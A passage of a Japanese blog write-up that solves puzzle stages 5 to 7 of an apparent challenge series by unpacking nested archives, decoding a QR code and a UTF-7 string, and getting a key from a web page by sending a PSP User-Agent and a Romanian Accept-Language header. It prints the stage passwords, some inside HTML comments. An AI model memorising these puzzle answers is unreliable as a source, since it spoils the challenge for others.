</span><span class='line'>&lt;p&gt;7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Processing archive: mondai5-6&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Extracting  nek&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Everything is Ok&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Size:       1332
</span><span class='line'>Compressed: 1472
</span></code></pre></td></tr></table></div></figure></p>

<p>nekを調べると、bzip圧縮ファイルとのことなので、<code>bzip2</code>コマンドで解凍します。</p>

<pre><code class="sh">$ file nek
nek: bzip2 compressed data, block size = 900k
$ bzip2 -d nek -c &gt; mondai5-8
</code></pre>

<p>mondai5-8は7z圧縮ファイルとのことなので、<code>7z</code>コマンドで解凍します。
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-8
</span><span class='line'>mondai5-8: 7-zip archive data, version 0.3
</span><span class='line'><span class="nv">$ </span>7z x mondai5-8&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Processing archive: mondai5-8&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Extracting  n&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Everything is Ok&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Size:       974
</span><span class='line'>Compressed: 1082
</span></code></pre></td></tr></table></div></figure></p>

<p>これによって、nというファイルが展開されます。このファイルはrar圧縮ファイルとのことなので<code>unrar</code>で解凍します。</p>

<pre><code class="sh">$ file n
n: RAR archive data, v1d, os: Win32
$ unrar x n

UNRAR 5.20 beta 1 freeware      Copyright (c) 1993-2014 Alexander Roshal


Extracting from n

Extracting  ne                                                        OK
All OK
</code></pre>

<p>neというファイルが出てきましたね。neはlha圧縮されたファイルとのことなので、<code>lha</code>コマンドで解凍します。</p>

<pre><code class="sh">$ file ne
ne: LHarc 1.x/ARX archive data [lh0]
$ lha x ne
nex     - Melted   :  o
</code></pre>

<p>nexファイルが出来上がりました。はい。調べるとxz圧縮なので<code>xz</code>で解凍します。</p>

<pre><code class="sh">$ file nex
nex: xz compressed data
$ xz -d nex -c &gt; mondai5-12
</code></pre>

<p>ちょっと疲れたのでコーヒーを飲みます。</p>

<p>mondai5-12を<code>file</code>コマンドで調べると、なんと、判定してくれません！（貧弱なfileめ）</p>

<pre><code class="sh">$ file mondai5-12
mondai5-12: data
</code></pre>

<p>マジックナンバーを見てみると、MSWIMとなってることが確認出ました。</p>

<pre><code class="sh">$ xxd mondai5-12 | head -2
0000000: 4d53 5749 4d00 0000 d000 0000 000d 0100  MSWIM...........
0000010: 8000 0000 0000 0000 4ef7 dcb4 6e01 bfe4  ........N...n...
</code></pre>

<p>Googleで「&#8221;MSWIM&#8221; magic number」として調べると、1番目に次のページがヒットします。</p>

<p><a href="http://en.wikipedia.org/wiki/Windows_Imaging_Format">Windows Imaging Format - Wikipedia, the free encyclopedia</a></p>

<p>このWikipediaの記事の最後に、<em>LZX圧縮だし7zとかで開けるよ（意訳）</em>と書いてあるので、<code>7z</code>で展開を試みてみます。</p>

<pre><code class="sh">$ 7z x mondai5-12

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai5-12

Extracting  QRcode

Everything is Ok

Size:       16052
Compressed: 17310
</code></pre>

<p>あっさりと展開でき、QRcodeという名のファイルが出てきました。
このファイルの形式はSun raster image dataとのことです。</p>

<pre><code class="sh">$ file QRcode
QRcode: Sun raster image data, 123 x 123, 8-bit, RGB colormap
</code></pre>

<p>画像データらしいですが、開けるアプリケーションを持ち合わせていないので、ImageMagickに投げ込んでみます。</p>

<pre><code class="sh">$ convert QRcode qrcode.png
$ file qrcode.png
qrcode.png: PNG image data, 123 x 123, 4-bit grayscale, non-interlaced
</code></pre>

<p>さすがImageMagick難なく変換できたすごい！
簡単に開ける形式の画像ファイルができたので開いてみます。</p>

<p><img src="/blog/resources/images//qrcode.png" alt="qrcode.png" /></p>

<p><a href="/blog/2014/12/07/seccon2014-online/">半分食べられてしまったパンケーキ</a>ではなく、普通のQRコードでした。</p>

<p>適当なQRコードリーダーで読み込むと、以下のような文字列が得られます。
<code>
+BCcENQQxBEMEQAQwBEgEOgQw-
</code>
+で始まり-で終わる文字列、そう、UTF-7エンコード文字列です。
+と-の間はUTF-16のBASE64エンコード文字列（ただしパッディングの=が省略されている）なので、<code>nkf</code>で変換してみます。
<code>sh
$ echo BCcENQQxBEMEQAQwBEgEOgQw | nkf -mB -W16B
</code></p>

<!--
Чебурашка
-->


<p>何やらロシア語らしきものが出てきます。意味を調べると、ロシアの絵本のキャラクターとのことです。</p>

<p><img src="/blog/resources/images//Cheburashka.jpg" alt="Cheburashka.jpg" /></p>

<p>これ以上解くものがなくなったので、これがmondai5の答えのようです。しかし<code>7z</code>コマンドで解凍を試みても、パスワードが違うと言われる始末です。</p>

<p>p7zipの<code>7z</code>コマンドによる非ASCII文字パスワード付き7zipの解凍・圧縮は、環境によって正しく処理されないということを、以前日本語パスワードをセットしたときに経験したのを思い出し、本家7zipの<code>7z.exe</code>を使って解凍をしてみます。</p>

<pre><code class="sh">$ wine 7z.exe x mondai6.zip

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai6.zip

Extracting  hint6.txt
Enter password (will not be echoed):

Extracting  mondai6.txt
Extracting  mondai7.zip

Everything is Ok

Files: 3
Size:       70362410
Compressed: 70373511

Kernel  Time =     0.046 =    1%
User    Time =     0.780 =   17%
Process Time =     0.826 =   18%    Virtual  Memory =      2 MB
Global  Time =     4.394 =  100%    Physical Memory =      4 MB
</code></pre>

<!--
$ wine 7z.exe x mondai6.zip -pЧебурашка

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai6.zip

Extracting  hint6.txt
Extracting  mondai6.txt
Extracting  mondai7.zip

Everything is Ok

Files: 3
Size:       70362410
Compressed: 70373511

Kernel  Time =     0.046 =    5%
User    Time =     0.811 =   89%
Process Time =     0.858 =   94%    Virtual  Memory =      2 MB
Global  Time =     0.909 =  100%    Physical Memory =      4 MB
-->


<p>解凍できました！（やっと終わった。。）</p>

<h1>mondai6</h1>

<p>mondai6.txtには以下のように記載がありました。
<code>
http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
</code>
実際にこのURLにアクセスしに行くと、次のようなレスポンスを得られました。</p>

<pre><code class="sh">$ curl -v http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
* Hostname was NOT found in DNS cache
*   Trying 49.212.84.208...
* Connected to 49.212.84.208 (49.212.84.208) port 80 (#0)
&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
&gt; User-Agent: curl/7.37.1
&gt; Host: 49.212.84.208
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Date: Tue, 07 Apr 2015 08:20:21 GMT
* Server Apache/2.2.3 (CentOS) is not blacklisted
&lt; Server: Apache/2.2.3 (CentOS)
&lt; Connection: close
&lt; Transfer-Encoding: chunked
&lt; Content-Type: text/html; charset=utf-8
&lt; 
{ [data not shown]

* Closing connection 0
&lt;HTML&gt;&lt;BODY&gt;use R4000
&lt;/BODY&gt;&lt;/HTML&gt;
</code></pre>

<p>なにやらR4000を使えとの文字だけが返ってきました。
R4000でGoogle検索すると、MIPSのプロセッサ情報がいくつか引っかかります。
MIPS R4000を搭載したデバイスでアクセスすればいいのかな？と思ったので、
Googleで「MIPS R4000 デバイス」で検索し、MIPS R4000搭載のデバイスを探してみました。</p>

<p><img src="/blog/resources/images//mips-r4000-search.png" alt="mips-r4000-search.png" /></p>

<p>検索結果1ページ目によると、PSPに搭載されているとの情報がいくつかヒットしていました。
早速PSPのブラウザからアクセスする際に送られるUser-Agentを調べてみます。</p>

<p><a href="http://www.openspc2.org/userAgent/">userAgent一覧/ユーザーエージェント一覧</a></p>

<p>このサイトによると、PSPのUAは、
<code>
Mozilla/4.0 (PSP PlayStation Portable); 2.00)
</code>
となっているようです。</p>

<p>早速このUAで先ほどのURLにアクセスしてみます。</p>

<pre><code class="sh">$ curl -v -A 'Mozilla/4.0 (PSP PlayStation Portable); 2.00)' http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
* Hostname was NOT found in DNS cache
*   Trying 49.212.84.208...
* Connected to 49.212.84.208 (49.212.84.208) port 80 (#0)
&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
&gt; User-Agent: Mozilla/4.0 (PSP PlayStation Portable); 2.00)
&gt; Host: 49.212.84.208
&gt; Accept: */*
&gt;
&lt; HTTP/1.1 200 OK
&lt; Date: Tue, 07 Apr 2015 08:31:47 GMT
* Server Apache/2.2.3 (CentOS) is not blacklisted
&lt; Server: Apache/2.2.3 (CentOS)
&lt; Content-Length: 42
&lt; Connection: close
&lt; Content-Type: text/html; charset=utf-8
&lt;
* Closing connection 0
&lt;HTML&gt;&lt;BODY&gt;de la Bucure?ti
&lt;/BODY&gt;&lt;/HTML&gt;
</code></pre>

<p>レスポンスが変わりました。知らない国の言葉で書かれていたのでGoogle翻訳にタイプしてみると、ルーマニア語であるとの情報を得ました。</p>

<p>先ほどのレスポンスの一部文字が&#8221;?&#8221;となっているので、ルーマニア語を許容するヘッダーを付加すると表示が変わるかもしれないと思い、Accept-Languageにルーマニア語を指定してアクセスしてみました。</p>

<pre><code class="sh">$ curl -v -H 'Accept-Language: ro-RO' -A 'Mozilla/4.0 (PSP PlayStation Portable); 2.00)' http://49.212.84.208/cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi
* Hostname was NOT found in DNS cache
*   Trying 49.212.84.208...
* Connected to 49.212.84.208 (49.212.84.208) port 80 (#0)
&gt; GET /cgi-bin/hode7hb376dgeas6df783gr4/mondai6.cgi HTTP/1.1
&gt; User-Agent: Mozilla/4.0 (PSP PlayStation Portable); 2.00)
&gt; Host: 49.212.84.208
&gt; Accept: */*
&gt; Accept-Language: ro-RO
&gt;
&lt; HTTP/1.1 200 OK
&lt; Date: Tue, 07 Apr 2015 08:35:33 GMT
* Server Apache/2.2.3 (CentOS) is not blacklisted
&lt; Server: Apache/2.2.3 (CentOS)
&lt; Connection: close
&lt; Transfer-Encoding: chunked
&lt; Content-Type: text/html; charset=utf-8
&lt;
* Closing connection 0
&lt;HTML&gt;&lt;BODY&gt;key: Minesweeper1990
&lt;/BODY&gt;&lt;/HTML&gt;
</code></pre>

<p>表示が変わり、mondai6の答えが出てきました。mondai7.zipのパスワードに指定して解凍してmondai6はおしまいです。</p>

<pre><code class="sh">$ 7z x mondai7.zip

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai7.zip

Extracting  hint7.txt
Enter password (will not be echoed) :

Extracting  mondai8.zip
Extracting  normal.exe

Everything is Ok

Files: 3
Size:       70383731
Compressed: 70362268
</code></pre>

<!--
$ 7z x mondai7.zip -pMinesweeper1990

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai7.zip

Extracting  hint7.txt
Extracting  mondai8.zip
Extracting  normal.exe

Everything is Ok

Files: 3
Size:       70383731
Compressed: 70362268
-->


<p>明日はmondai7からmondai9までのWrite-upを公開する予定です。</p>
]]></content>
  </entry>
  
</feed>
